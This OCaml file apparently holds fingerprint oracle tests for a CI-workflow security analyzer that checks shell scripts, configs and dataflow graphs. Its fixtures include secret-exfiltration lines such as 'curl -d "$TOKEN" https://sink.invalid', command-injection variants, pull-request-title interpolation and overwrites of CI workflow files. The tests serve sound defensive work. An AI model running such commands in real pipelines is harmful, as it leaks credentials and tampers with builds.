exception Oracle_failed of string

let failures = ref []

let record_failure format =
  Printf.ksprintf (fun message -> failures := message :: !failures) format

let fingerprint name expected value =
  let actual = Json.to_string value |> Sha256.digest_string in
  Printf.printf "mutation oracle %s: %s\n%!" name actual;
  if actual <> expected then
    record_failure "%s fingerprint changed: expected %s, found %s" name expected
      actual

let strings values =
  Json.Array (List.map (fun value -> Json.String value) values)

let script_summary_json (summary : Script_adapter.summary) =
  Json.Object
    [
      ("shell", Json.String (Script_adapter.shell_name summary.shell));
      ( "tokens",
        Json.Array
          (List.map
             (fun (token : Script_adapter.token) ->
               Json.Object
                 [
                   ("quoted", Json.Bool token.quoted);
                   ("start", Json.Int token.start);
                   ("stop", Json.Int token.stop);
                   ("text", Json.String token.text);
                 ])
             summary.tokens) );
      ( "capabilities",
        strings (List.map Ir.capability_name summary.capabilities) );
      ("effects", strings (List.map Ir.effect_name summary.effects));
      ("unknowns", Json.Array (List.map Unknown.to_json summary.unknowns));
      ( "expansions",
        Json.Array
          (List.map
             (fun (expansion : Script_adapter.expansion) ->
               Json.Object
                 [
                   ("quoted", Json.Bool expansion.expansion_quoted);
                   ("start", Json.Int expansion.expansion_start);
                   ("stop", Json.Int expansion.expansion_stop);
                   ("text", Json.String expansion.expansion_text);
                 ])
             summary.expansions) );
      ("unsafe_interpolation", Json.Bool summary.unsafe_interpolation);
      ("secret_to_network", Json.Bool summary.secret_to_network);
      ("secret_to_output", Json.Bool summary.secret_to_output);
    ]

let script_oracle () =
  let cases =
    [
      (Script_adapter.Posix, "printf '%s' \"$TITLE\"");
      (Posix, "echo $TITLE | tee output.txt");
      (Posix, "cat < private.txt > public.txt");
      (Posix, "curl -H \"Authorization: Bearer $TOKEN\" https://api.example");
      (Posix, "wget -O artifact.tgz https://example.invalid/a");
      (Posix, "git config credential.helper store");
      (Posix, "git push origin HEAD:main");
      (Posix, "gh release create v1 dist/app");
      (Posix, "docker login registry.example --password-stdin");
      (Posix, "kubectl apply -f deployment.yml");
      (Posix, "terraform apply -auto-approve");
      (Posix, "aws cloudformation deploy --stack-name app");
      (Posix, "cp artifact /tmp/cache && chmod 600 /tmp/cache");
      (Bash, "STAMP=$(date); printf '%s' ${TITLE}");
      (Bash, "echo '${{ secrets.TOKEN }}'");
      (Bash, "echo ${{ github.event.pull_request.title }}");
      (Bash, "printf '%s' \"$NPM_TOKEN\" > private.txt");
      (Bash, "printf '%s' \"$NPM_TOKEN\" > $DESTINATION");
      (Bash, "echo \"$PASSWORD\" | docker login --password-stdin host");
      (Bash, "false || curl https://fallback.invalid");
      (Bash, "true && rm -f scratch.tmp");
      (Bash, "python - <<'PY'\nprint('safe')\nPY");
      (PowerShell, "Write-Output $env:TITLE");
      (PowerShell, "Write-Output \"$env:TOKEN\" | Tee-Object log.txt");
      (PowerShell, "Invoke-WebRequest -Uri https://example.invalid");
      (PowerShell, "Set-Content -Path out.txt -Value $env:SECRET");
      (PowerShell, "gh api repos/o/r/releases");
      (Cmd, "echo %TITLE%");
      (Cmd, "echo !TOKEN! > output.txt");
      (Cmd, "curl.exe https://example.invalid && git push");
      (Cmd, "set TOKEN=secret & echo %TOKEN%");
      (Python, "print(os.environ['TOKEN'])");
      (Python, "requests.post(url, data=os.environ.get('TOKEN'))");
      (Python, "subprocess.run(['git', 'push'])");
      (Python, "open('artifact.bin', 'wb').write(data)");
      (Unknown_shell "fish", "curl https://example.invalid | read token");
      (Unknown_shell "nushell", "open secret.txt | http post https://sink");
    ]
  in
  Json.Array
    (List.map
       (fun (shell, source) ->
         Json.Object
           [
             ("source", Json.String source);
             ( "summary",
               script_summary_json (Script_adapter.analyze shell source) );
           ])
       cases)
  |> fingerprint "script-adapter"
       "6730432f3d2f13af4cef4d627a4c5e2788e21739f2abe696a5cb9030ae831594"

let script_edge_oracle () =
  let cases =
    [
      (Script_adapter.Bash, {|printf "%s" "a\";b"; echo $TOKEN|});
      (Bash, {|printf '%s' 'a;|b'; echo $TOKEN|});
      (Bash, {|printf a\;b && echo $TOKEN|});
      (Bash, {|printf '%s' "$(printf 'a|b')" | tee output.txt|});
      (Bash, "echo $TOKEN;");
      (Bash, "echo $TOKEN&printf safe");
      (Bash, "echo $TOKEN&&printf safe");
      (Bash, "echo $TOKEN||printf safe");
      (Bash, "echo $TOKEN|");
      (Bash, "echo $TOKEN|cat");
      (Bash, "echo $TOKEN||cat");
      (Bash, {|echo "$TOKEN" > "private\"file"|});
      (Bash, {|echo "$TOKEN" > 'private file'|});
      (Bash, "echo $TOKEN >");
      (Bash, "echo $TOKEN > private.txt");
      (Bash, "echo $TOKEN >> private.txt");
      (Bash, "echo $TOKEN 2> private.txt");
      (Bash, "echo $TOKEN &> private.txt");
      (Bash, "echo $TOKEN >= private.txt");
      (Bash, "echo $(printf x > nested.txt) $TOKEN");
      (Bash, "echo $TOKEN > first.txt > second.txt");
      (Bash, "echo $TOKEN > /dev/stdout");
      (Bash, "echo $TOKEN > /dev/stderr");
      (Cmd, "echo %TOKEN% > con");
      (Cmd, "echo %TOKEN% > conout$");
      (Cmd, "echo %TOKEN% > prn");
      (Bash, "echo $TOKEN > /proc/self/fd/1");
      (Bash, {|echo $TOKEN > "out file"|});
      (Bash, "echo $TOKEN > $DESTINATION");
      (Cmd, "echo %TOKEN% > %DESTINATION%");
      (Cmd, "echo !TOKEN! > !DESTINATION!");
      (Bash, "echo $TOKEN | base64");
      (Bash, "echo $TOKEN | cat");
      (Bash, "echo $TOKEN | jq .");
      (Bash, "echo $TOKEN | openssl enc -base64");
      (Bash, "echo $TOKEN | sed 's/x/y/'");
      (Bash, "echo $TOKEN | tee /dev/stdout");
      (Bash, "echo $TOKEN | tr a-z A-Z");
      (Bash, "echo $TOKEN | xxd");
      (Bash, "echo $TOKEN | head -1");
      (Bash, "echo $TOKEN | custom-filter > dynamic target");
      (Bash, "printf evil > .github/workflows/ci.yml");
      (PowerShell, "Set-Content .gitlab-ci.yml evil");
      (PowerShell, "Set-Content azure-pipelines.yml evil");
      (Bash, "printf evil > .circleci/config.yml");
      (Bash, {|echo "$(date)"|});
      (PowerShell, {|Write-Output "$(Get-Date)"|});
      (Python, {|print("$(literal)")|});
      (Bash, {|echo "$TOKEN; curl https://sink.invalid"|});
      (Bash, {|echo '$TOKEN; curl https://sink.invalid'|});
      (Bash, {|echo "$TOKEN"; curl https://sink.invalid|});
      (Bash, {|echo '$TOKEN'; curl https://sink.invalid|});
      (Bash, {|echo "$TOKEN\"; curl https://sink.invalid"|});
      (Bash, {|echo $TOKEN\;curl https://sink.invalid|});
      (Bash, {|echo $TOKEN;curl https://sink.invalid|});
      (Bash, {|echo $TOKEN&&curl https://sink.invalid|});
      (Bash, {|echo $TOKEN||curl https://sink.invalid|});
      (Bash, {|echo $TOKEN&curl https://sink.invalid|});
      (Bash, {|echo $TOKEN$(curl https://sink.invalid)|});
      (Bash, {|echo "$TOKEN > private.txt"|});
      (Bash, {|echo '$TOKEN > private.txt'|});
      (Bash, {|echo "$TOKEN\" > private.txt"|});
      (Bash, {|echo "$TOKEN" > private.txt|});
      (Bash, {|echo '$TOKEN' > private.txt|});
      (Bash, {|echo $TOKEN $(printf x > private.txt)|});
      (Bash, {|echo $TOKEN 2> /dev/stdout|});
      (Bash, {|echo $TOKEN > private.txt > /dev/stdout|});
      (Bash, {|echo $TOKEN > "/dev/stdout"|});
      (Bash, {|echo $TOKEN > '/dev/stdout'|});
      (Bash, {|echo $TOKEN > "/dev/stdout'|});
      (Bash, {|echo $TOKEN >> /dev/stdout|});
      (Bash, {|echo "$TOKEN\x"; curl https://sink.invalid|});
      (Bash, {|echo $TOKEN\x; curl https://sink.invalid|});
      (Bash, {|echo $TOKEN ""; curl https://sink.invalid|});
      (Bash, {|printf safe; printf safe; echo $TOKEN|});
      (Bash, {|printf safe&&echo $TOKEN|});
      (Bash, {|printf safe||echo $TOKEN|});
      (Bash, {|echo $TOKEN&|});
    ]
  in
  Json.Array
    (List.map
       (fun (shell, source) ->
         Json.Object
           [
             ("source", Json.String source);
             ("summary", script_summary_json (Script_adapter.analyze shell source));
           ])
       cases)
  |> fingerprint "script-edges"
       "d52f3ddf3a87a9c887f3377bd3d54509484d7cd5ca66c8811b72277459ae7273"

let config_result_json source =
  match Config.parse source with
  | Ok config -> Json.Object [ ("ok", Config.to_json config) ]
  | Error errors -> Json.Object [ ("errors", strings errors) ]

let full_config =
  "version = 1\n" ^ "persona = \"paranoid\" # strict gate\n"
  ^ "frontends = [\"github\", \"gitlab\", \"azure\", \"circleci\"]\n"
  ^ "offline = true\n" ^ "[resolver]\nrequire_immutable = true\n"
  ^ "allowed_sources = [\"github.com\", \"gitlab.com\"]\n"
  ^ "[sandbox]\nbackend = \"linux-native\"\n" ^ "image = \"sha256:"
  ^ String.make 64 'a' ^ "\"\n"
  ^ "network = \"deny\"\ncpu_seconds = 7\nmemory_mb = 64\n"
  ^ "processes = 8\noutput_bytes = 4096\n"
  ^ "[[allowlist]]\nkind = \"dependency\"\nvalue = \"owner/action\"\n"
  ^ "reason = \"reviewed # literal\"\n"
  ^ "[[allowlist]]\nkind = \"network_host\"\nvalue = \"example.com\"\n"
  ^ "reason = \"required API\"\n"
  ^ "[[rules]]\nid = \"ORG-ALL\"\nkind = \"forbid\"\n"
  ^ "selector.mode = \"all\"\nselector.provider = \"github\"\n"
  ^ "selector.trust = \"untrusted\"\nselector.effect = \"network\"\n"
  ^ "message = \"untrusted network\"\nseverity = \"critical\"\n"
  ^ "[[rules]]\nid = \"ORG-ANY\"\nkind = \"limit\"\nlimit = 2\n"
  ^ "selector.mode = \"any\"\nselector.capability = \"repository_write\"\n"
  ^ "selector.kind = \"command\"\nseverity = \"warning\"\n"
  ^ "[[rules]]\nid = \"ORG-NONE\"\nkind = \"require\"\n"
  ^ "selector.mode = \"none\"\nselector.mutability = \"mutable\"\n"
  ^ "severity = \"note\"\n"
  ^ "[[rules]]\nid = \"ORG-PATH\"\nkind = \"forbid_path\"\n"
  ^ "selector.path = \".github/\"\nselector.dominance = \"false\"\n"
  ^ "[[suppressions]]\nrule = \"WV-SEC-001\"\n"
  ^ "path = \".github/workflows/ci.yml\"\nreason = \"reviewed fixture\"\n"
  ^ "[[suppressions]]\nrule = \"WV-NOTE\"\nreason = \"global review\"\n"

let config_oracle () =
  let invalid =
    [
      "version = 2\n";
      "version = one\n";
      "offline = false\n";
      "offline = maybe\n";
      "persona = \"unknown\"\n";
      "frontends = [\"github\", \"github\"]\n";
      "frontends = [\"other\"]\n";
      "eval = \"danger()\"\n";
      "unknown = true\n";
      "[unknown]\nvalue = 1\n";
      "[resolver]\nrequire_immutable = false\n";
      "[resolver]\nallowed_sources = broken\n";
      "[resolver]\nunknown = true\n";
      "[resolver]\n\
       require_immutable = true\n\
       [resolver]\n\
       require_immutable = true\n";
      "[sandbox]\nbackend = \"unknown\"\n";
      "[sandbox]\nbackend = \"oci:\"\n";
      "[sandbox]\nimage = \"mutable\"\n";
      "[sandbox]\nnetwork = \"allow\"\n";
      "[sandbox]\ncpu_seconds = 0\n";
      "[sandbox]\nprocesses = nope\n";
      "[[rules]]\nid = \"X\"\nkind = \"unknown\"\n";
      "[[rules]]\nid = \"X\"\nkind = \"limit\"\nlimit = nope\n";
      "[[rules]]\nid = \"X\"\nkind = \"forbid\"\nseverity = \"fatal\"\n";
      "[[rules]]\nid = \"X\"\nkind = \"forbid\"\nselector.mode = \"xor\"\n";
      "[[rules]]\n\
       id = \"X\"\n\
       kind = \"forbid\"\n\
       selector.effect = \"teleport\"\n";
      "[[suppressions]]\nrule = \"X\"\nreason = \"\"\n";
      "[[suppressions]]\nrule = \"X\"\nreason = \"ok\"\nextra = \"bad\"\n";
      "[[allowlist]]\nkind = \"other\"\nvalue = \"x\"\nreason = \"r\"\n";
      "[[allowlist]]\nkind = \"source\"\nvalue = \"\"\nreason = \"r\"\n";
      "this is not an assignment\n";
    ]
  in
  let suppression_evidence =
    match Config.parse full_config with
    | Error _ -> Json.Bool false
    | Ok config ->
        let diagnostic file rule =
          Diagnostic.make ~rule_id:rule ~severity:Diagnostic.Warning
            ~confidence:Diagnostic.Medium ~message:"fixture"
            ~span:
              (Span.make ~file (Span.position ~byte:0 ())
                 (Span.position ~byte:1 ()))
            ()
        in
        Json.Array
          [
            Json.Bool
              (Config.suppressed config
                 (diagnostic ".github/workflows/ci.yml" "WV-SEC-001"));
            Json.Bool
              (Config.suppressed config
                 (diagnostic ".github/workflows/other.yml" "WV-SEC-001"));
            Json.Bool
              (Config.suppressed config (diagnostic "any.yml" "WV-NOTE"));
          ]
  in
  Json.Object
    [
      ("default", Config.to_json Config.default);
      ("full", config_result_json full_config);
      ("invalid", Json.Array (List.map config_result_json invalid));
      ("suppressed", suppression_evidence);
    ]
  |> fingerprint "config"
       "4856d1b02ac8e29e9d01890c5d97d3f4c3716c525c27648a08b62907b0aec728"

let position index =
  Span.position ~byte:(index * 3) ~line:(index + 1) ~column:2 ()

let span index file = Span.make ~file (position index) (position (index + 1))

let value ?(trust = Abstract_value.Trusted) ?(secrecy = Abstract_value.Public)
    index text =
  Abstract_value.string_constant text ~trust ~secrecy
    ~provenance:
      [
        {
          Abstract_value.origin = "oracle";
          operation = "fixture";
          span = span index "oracle.yml";
        };
      ]

let node ?(provider = Ir.Github) ?(kind = Ir.Command) ?(phase = Ir.Run)
    ?(condition = Condition.true_) ?(attributes = []) ?(capabilities = [])
    ?(effects = []) ?unknown index name =
  Ir.make_node ~provider ~kind ~name ~phase ~span:(span index "oracle.yml")
    ~condition ~attributes ~capabilities ~effects ?unknown ()

let edge ?(kind = Ir.Control) ?(condition = Condition.true_) ?label
    (source : Ir.node) (target : Ir.node) =
  Ir.make_edge ~kind ~from_:source.Ir.id ~to_:target.Ir.id ~condition ?label ()

let graph ?(provider = Ir.Github) ?(source = "oracle.yml") nodes edges entries =
  List.fold_left
    (fun state item -> Ir.add_node item state)
    (Ir.empty provider source) nodes
  |> fun state ->
  List.fold_left (fun state item -> Ir.add_edge item state) state edges
  |> fun state ->
  List.fold_left
    (fun state (entry : Ir.node) -> Ir.add_entrypoint entry.id state)
    state entries
  |> Ir.finalize

let all_capabilities =
  [
    Ir.Repository_read;
    Repository_write;
    Token_read;
    Token_write;
    Oidc;
    Cloud_credential;
    Secret_access;
    Network;
    Filesystem_read;
    Filesystem_write;
    Shell;
    Artifact_read;
    Artifact_write;
    Cache_read;
    Cache_write;
    Deployment;
    Self_hosted_persistence;
    Ai_tool;
  ]

let all_effects =
  [
    Ir.Repository_change;
    Network_request;
    File_read;
    File_write;
    Command_execution;
    Artifact_publish;
    Cache_publish;
    Deployment_change;
    Credential_use;
    Workflow_change;
    Ai_agent_execution;
  ]

let semantic_graph () =
  let entry =
    node ~kind:Ir.Workflow ~phase:Ir.Compile
      ~capabilities:[ Ir.Repository_write; Token_write; Oidc ]
      0 "workflow"
  and untrusted =
    node ~kind:Ir.Resource
      ~attributes:
        [ ("value", value ~trust:Abstract_value.Untrusted 1 "pull request") ]
      1 "event:pull_request"
  and secret =
    node ~kind:Ir.Resource
      ~attributes:[ ("value", value ~secrecy:Abstract_value.Secret 2 "TOKEN") ]
      2 "secret:TOKEN"
  and gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~condition:(Condition.atom "github.ref_protected")
      ~attributes:[ ("mechanism", value 3 "approval") ]
      3 "environment approval"
  and unsafe =
    node
      ~attributes:
        [
          ( "command",
            value ~trust:Abstract_value.Untrusted 4
              "echo ${{ github.event.pull_request.title }}" );
        ]
      ~capabilities:[ Ir.Shell ] 4 "echo $TITLE"
  and exfil =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret 5
              "curl -d \"$TOKEN\" https://sink.invalid" );
        ]
      ~capabilities:[ Ir.Shell; Network; Secret_access ]
      5 "curl secret"
  and artifact =
    node ~kind:Ir.Resource
      ~capabilities:[ Ir.Artifact_read; Artifact_write ]
      6 "artifact:bundle"
  and cache =
    node ~kind:Ir.Resource
      ~capabilities:[ Ir.Cache_read; Cache_write ]
      7 "cache:dependencies"
  and checkout =
    node ~kind:Ir.Call
      ~attributes:
        [
          ("ref", value ~trust:Abstract_value.Untrusted 8 "feature");
          ("persist-credentials", value 8 "true");
        ]
      ~capabilities:[ Ir.Network; Self_hosted_persistence ]
      8 "actions/checkout@v4"
  and credential =
    node ~kind:Ir.Call
      ~attributes:
        [ ("credential", value ~secrecy:Abstract_value.Secret 9 "TOKEN") ]
      ~capabilities:[ Ir.Secret_access; Self_hosted_persistence ]
      9 "credential helper"
  and agent =
    node ~kind:Ir.Call
      ~attributes:
        [ ("prompt", value ~trust:Abstract_value.Untrusted 10 "issue body") ]
      ~capabilities:[ Ir.Network; Ai_tool ] ~effects:[ Ir.Ai_agent_execution ]
      10 "openai agent-action"
  and deploy =
    node ~capabilities:[ Ir.Shell; Deployment ]
      ~effects:[ Ir.Deployment_change ] 11 "kubectl apply -f deployment.yml"
  and self_modify =
    node
      ~capabilities:[ Ir.Shell; Filesystem_write ]
      12 "git add .github/workflows/ci.yml && git push"
  and immutable = node ~kind:Ir.Call 13 ("owner/action@" ^ String.make 40 'a')
  and digest_call =
    node ~kind:Ir.Call
      ~attributes:
        [ ("dependency.digest", value 14 ("sha256:" ^ String.make 64 'b')) ]
      14 "registry/action@stable"
  and unknown =
    node ~kind:Ir.Opaque
      ~unknown:(Unknown.Unsupported_syntax "dynamic provider expression") 15
      "dynamic"
  in
  graph
    [
      entry;
      untrusted;
      secret;
      gate;
      unsafe;
      exfil;
      artifact;
      cache;
      checkout;
      credential;
      agent;
      deploy;
      self_modify;
      immutable;
      digest_call;
      unknown;
    ]
    [
      edge entry gate;
      edge gate deploy;
      edge entry unsafe;
      edge entry exfil;
      edge entry self_modify;
      edge ~kind:Ir.Data untrusted unsafe;
      edge ~kind:Ir.Data secret exfil;
      edge ~kind:Ir.Write untrusted artifact;
      edge ~kind:Ir.Persist artifact deploy;
      edge ~kind:Ir.Write untrusted cache;
      edge ~kind:Ir.Read cache deploy;
      edge ~kind:Ir.Data untrusted checkout;
      edge ~kind:Ir.Call_edge checkout deploy;
      edge ~kind:Ir.Data secret credential;
      edge ~kind:Ir.Persist credential self_modify;
      edge ~kind:Ir.Data untrusted agent;
      edge ~kind:Ir.Call_edge agent self_modify;
      edge entry immutable;
      edge entry digest_call;
    ]
    [ entry ]

let bypass_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 30 "bypass workflow"
  and gate = node ~kind:Ir.Gate ~phase:Ir.Plan 31 "environment approval"
  and deploy =
    node ~kind:Ir.Effect
      ~effects:[ Ir.Repository_change; Deployment_change ]
      ~capabilities:[ Ir.Repository_write; Deployment ]
      32 "release"
  in
  graph [ entry; gate; deploy ]
    [ edge entry gate; edge gate deploy; edge entry deploy ]
    [ entry ]

let cyclic_graph () =
  let first = node ~kind:Ir.Call 40 "first"
  and second = node ~kind:Ir.Call 41 "second"
  and third = node ~kind:Ir.Step 42 "third" in
  graph [ first; second; third ]
    [
      edge ~kind:Ir.Call_edge first second;
      edge ~kind:Ir.Call_edge second first;
      edge first third;
      edge third first;
    ]
    [ first ]

let path_json = function
  | None -> Json.Null
  | Some nodes -> strings (List.map (fun (item : Ir.node) -> item.name) nodes)

let demand_json ((owner, capability), demand) =
  Json.Object
    [
      ("owner", Json.String owner.Ir.name);
      ("capability", Json.String (Ir.capability_name capability));
      ( "demand",
        match demand with
        | Capability_analysis.Required -> Json.String "required"
        | Excessive -> Json.String "excessive"
        | Unknown reasons -> Json.Array (List.map Unknown.to_json reasons) );
    ]

let policy_assignment_json index (key, value) =
  match Policy.predicate_of_assignment key value with
  | Error message ->
      Json.Object
        [
          ("key", Json.String key);
          ("value", Json.String value);
          ("error", Json.String message);
        ]
  | Ok predicate ->
      Policy.rule_to_json
        {
          Policy.id = Printf.sprintf "P-%03d" index;
          kind = Forbid;
          selector = All [ predicate ];
          message = key ^ "=" ^ value;
          severity = Diagnostic.Warning;
        }

let semantic_oracle () =
  let graph = semantic_graph ()
  and bypass = bypass_graph ()
  and cyclic = cyclic_graph () in
  let assignments =
    [
      ("provider", "github");
      ("provider", "gitlab");
      ("provider", "azure");
      ("provider", "circleci");
      ("kind", "trigger");
      ("kind", "parameter");
      ("kind", "workflow");
      ("kind", "stage");
      ("kind", "job");
      ("kind", "step");
      ("kind", "call");
      ("kind", "command");
      ("kind", "gate");
      ("kind", "resource");
      ("kind", "effect");
      ("kind", "opaque");
      ("path", ".github/");
      ("trust", "trusted");
      ("trust", "untrusted");
      ("trust", "mixed");
      ("trust", "unknown");
      ("effect", "repository_change");
      ("effect", "network_request");
      ("effect", "file_read");
      ("effect", "file_write");
      ("effect", "command_execution");
      ("effect", "artifact_publish");
      ("effect", "cache_publish");
      ("effect", "deployment_change");
      ("effect", "credential_use");
      ("effect", "workflow_change");
      ("effect", "ai_agent_execution");
    ]
    @ List.map
        (fun value -> ("capability", Ir.capability_name value))
        all_capabilities
    @ [
        ("mutability", "immutable");
        ("mutability", "mutable");
        ("mutability", "local");
        ("mutability", "unknown");
        ("dominance", "true");
        ("dominance", "false");
        ("provider", "invalid");
        ("kind", "invalid");
        ("trust", "invalid");
        ("effect", "invalid");
        ("capability", "invalid");
        ("mutability", "invalid");
        ("dominance", "invalid");
        ("unknown", "value");
      ]
  in
  let policy_rules =
    [
      {
        Policy.id = "ORACLE-FORBID";
        kind = Forbid;
        selector = Any [ Capability Ir.Network; Effect Ir.Workflow_change ];
        message = "network or workflow change";
        severity = Diagnostic.Critical;
      };
      {
        Policy.id = "ORACLE-REQUIRE";
        kind = Require;
        selector = All [ Provider Ir.Gitlab; Node_kind Ir.Trigger ];
        message = "gitlab trigger required";
        severity = Diagnostic.Error;
      };
      {
        Policy.id = "ORACLE-LIMIT";
        kind = Limit 2;
        selector = None_of [ Trust Policy.Trusted ];
        message = "untrusted surface limited";
        severity = Diagnostic.Warning;
      };
      {
        Policy.id = "ORACLE-PATH";
        kind = Forbid_path;
        selector = All [ Effect Ir.Deployment_change; Dominated_by_gate true ];
        message = "tainted deployment path";
        severity = Diagnostic.Note;
      };
    ]
  in
  let solution = Dataflow.solve graph in
  let first = List.hd graph.Ir.nodes
  and last = List.hd (List.rev graph.nodes) in
  let graph_facts =
    Json.Object
      [
        ("graph", Ir.to_json graph);
        ("bypass", Ir.to_json bypass);
        ("cyclic", Ir.to_json cyclic);
        ("dataflow_complete", Json.Bool solution.complete);
        ( "dataflow",
          Json.Array
            (List.map
               (fun (item : Ir.node) ->
                 Json.Object
                   [
                     ("node", Json.String item.name);
                     ( "value",
                       Abstract_value.to_json
                         (Dataflow.value_at solution item.id) );
                   ])
               graph.nodes) );
        ( "shortest",
          path_json (Graph_algorithms.shortest_path graph first.id last.id) );
        ( "shortest_without_gate",
          path_json
            (Graph_algorithms.shortest_path ~avoid:[ first.id ] graph first.id
               last.id) );
        ( "control_cycles",
          Json.Array (List.map strings (Graph_algorithms.control_cycles cyclic))
        );
        ( "call_cycles",
          Json.Array
            (List.map strings
               (Graph_algorithms.cycles ~edge_kinds:[ Ir.Call_edge ] cyclic)) );
        ( "dominance",
          Json.Array
            [
              Json.Bool
                (Graph_algorithms.dominates bypass
                   ~dominator:(List.nth bypass.nodes 0).id
                   ~node:(List.nth bypass.nodes 2).id);
              Json.Bool
                (Graph_algorithms.dominates bypass
                   ~dominator:(List.nth bypass.nodes 1).id
                   ~node:(List.nth bypass.nodes 2).id);
            ] );
        ( "grant_demands",
          Json.Array
            (List.map demand_json (Capability_analysis.grant_demands graph)) );
        ( "minimal_capabilities",
          strings
            (Graph_algorithms.shortest_path graph first.id last.id
            |> Option.value ~default:[] |> Capability_analysis.minimal_for_path
            |> List.map Ir.capability_name) );
      ]
  in
  let verifier =
    Json.Array
      (List.concat_map
         (fun candidate ->
           List.map
             (fun persona ->
               let result = Verifier.verify ~persona candidate in
               Json.Object
                 [
                   ("persona", Json.String (Verifier.persona_name persona));
                   ("result", Verifier.to_json result);
                   ( "should_fail",
                     Json.Bool (Verifier.should_fail persona result) );
                 ])
             [ Verifier.Gate; Audit; Paranoid ])
         [ graph; bypass; cyclic; Ir.empty Ir.Github "empty.yml" ])
  in
  let policy =
    Json.Object
      [
        ( "assignments",
          Json.Array (List.mapi policy_assignment_json assignments) );
        ("rules", Json.Array (List.map Policy.rule_to_json policy_rules));
        ( "diagnostics",
          Json.Array
            (List.map Diagnostic.to_json (Policy.evaluate policy_rules graph))
        );
      ]
  in
  let program = Program_graph.compose [ graph; bypass ] |> Ir.to_json in
  Json.Object
    [
      ( "enum_capabilities",
        strings (List.map Ir.capability_name all_capabilities) );
      ("enum_effects", strings (List.map Ir.effect_name all_effects));
      ("graph_facts", graph_facts);
      ("policy", policy);
      ("program", program);
      ("verifier", verifier);
    ]
  |> fingerprint "semantic-core"
       "8c013588d3dc61c0f9169463aa6c6bcbd45a207f11f8771958610a583606bff8"

let abstract_string value =
  {
    Abstract_value.value_type = String_type;
    value = String value;
    trust = Trusted;
    secrecy = Public;
    provenance = [];
  }

let abstract_edge_evidence () =
  let prefix =
    Abstract_value.join
      (abstract_string (Affix { prefix = Some "identical"; suffix = None }))
      (abstract_string (Constants [ "identical" ]))
  and suffix =
    Abstract_value.join
      (abstract_string (Affix { prefix = None; suffix = Some "same-ending" }))
      (abstract_string (Constants [ "same-ending" ]))
  and list_value =
    {
      Abstract_value.value_type = List_type;
      value = List None;
      trust = Trusted;
      secrecy = Public;
      provenance = [];
    }
  and shared_affix =
    Abstract_value.join
      (abstract_string
         (Affix { prefix = Some "alphabet"; suffix = Some "ending" }))
      (abstract_string
         (Affix { prefix = Some "alpine"; suffix = Some "bending" }))
  and identical_pattern =
    Abstract_value.join
      (abstract_string (Pattern "[a-z]+"))
      (abstract_string (Pattern "[a-z]+"))
  in
  Json.Object
    [
      ("identical_prefix", Abstract_value.to_json prefix);
      ("identical_suffix", Abstract_value.to_json suffix);
      ("shared_affix", Abstract_value.to_json shared_affix);
      ("identical_pattern", Abstract_value.to_json identical_pattern);
      ("list_type", Abstract_value.to_json list_value);
    ]

let json_parse_evidence () =
  let parse source =
    match Json.parse source with
    | Ok value -> Json.Object [ ("ok", value) ]
    | Error error ->
        Json.Object
          [
            ("error", Json.String error.message);
            ("offset", Json.Int error.offset);
          ]
  in
  Json.Array
    [
      parse "\"\\/\"";
      parse "\"\\r\"";
      parse "\"\\q\"";
      parse ("\"" ^ String.make 1 '\001' ^ "\"");
    ]

let ordering_edge_evidence () =
  let diagnostic ?(rule_id = "ORDER-EDGE") span confidence message =
    Diagnostic.make ~rule_id ~severity:Diagnostic.Note
      ~confidence ~message ~span ()
  and property ?subject ?(state = Property.Proved) explanation =
    { Property.id = "ORDER-EDGE"; state; subject; explanation }
  in
  let diagnostic_left = diagnostic (span 200 "z.yml") Diagnostic.Low "left"
  and diagnostic_right =
    diagnostic (span 201 "a.yml") Diagnostic.High "right"
  and diagnostic_rule_left =
    diagnostic ~rule_id:"ORDER-A" (span 202 "same.yml") Diagnostic.High
      "same"
  and diagnostic_rule_right =
    diagnostic ~rule_id:"ORDER-Z" (span 202 "same.yml") Diagnostic.High
      "same"
  and unknown_left =
    property
      ~state:(Property.Unknown [ Unknown.External_state "alpha" ])
      "same"
  and unknown_right =
    property
      ~state:(Property.Unknown [ Unknown.External_state "omega" ])
      "same"
  and explanation_left = property ~subject:"same" "alpha"
  and explanation_right = property ~subject:"same" "omega" in
  Json.Object
    [
      ("low", Diagnostic.to_json diagnostic_left);
      ("diagnostic_compare", Json.Int (Diagnostic.compare diagnostic_left diagnostic_right));
      ( "diagnostic_rule_compare",
        Json.Int (Diagnostic.compare diagnostic_rule_left diagnostic_rule_right)
      );
      ("unknown_compare", Json.Int (Property.compare unknown_left unknown_right));
      ( "explanation_compare",
        Json.Int (Property.compare explanation_left explanation_right) );
    ]

let graph_algorithm_edge_evidence () =
  let chain_nodes =
    List.init 80 (fun index ->
        node
          ~attributes:[ ("value", value (300 + index) (Printf.sprintf "v%02d" index)) ]
          (300 + index) (Printf.sprintf "chain-%02d" index))
  in
  let chain_edges =
    List.init 79 (fun index ->
        edge ~kind:Ir.Data (List.nth chain_nodes index)
          (List.nth chain_nodes (index + 1)))
  in
  let chain = graph chain_nodes chain_edges [ List.hd chain_nodes ] in
  let chain_solution = Dataflow.solve chain in
  let root = node 400 "root"
  and left = node 401 "left"
  and right = node 402 "right"
  and sink = node 403 "sink"
  and data_only = node 404 "data-only" in
  let diamond =
    graph
      [ root; left; right; sink; data_only ]
      [
        edge root left;
        edge root right;
        edge left sink;
        edge right sink;
        edge ~kind:Ir.Data data_only root;
      ]
      []
  in
  let path ?(avoid = []) (source : Ir.node) (target : Ir.node) =
    Graph_algorithms.shortest_path ~avoid diamond source.Ir.id target.Ir.id
    |> path_json
  in
  Json.Object
    [
      ("chain_complete", Json.Bool chain_solution.complete);
      ( "chain_tail",
        Abstract_value.to_json
          (Dataflow.value_at chain_solution (List.hd (List.rev chain_nodes)).id)
      );
      ("path", path root sink);
      ("avoid-left", path ~avoid:[ left.id ] root sink);
      ("avoid-source", path ~avoid:[ root.id ] root sink);
      ("avoid-target", path ~avoid:[ sink.id ] root sink);
      ( "dominance",
        Json.Array
          [
            Json.Bool
              (Graph_algorithms.dominates diamond ~dominator:root.id
                 ~node:sink.id);
            Json.Bool
              (Graph_algorithms.dominates diamond ~dominator:left.id
                 ~node:sink.id);
            Json.Bool
              (Graph_algorithms.dominates diamond ~dominator:data_only.id
                 ~node:root.id);
            Json.Bool
              (Graph_algorithms.dominates diamond ~dominator:root.id
                 ~node:"missing");
          ] );
      ("acyclic", Json.Array (List.map strings (Graph_algorithms.cycles diamond)));
    ]

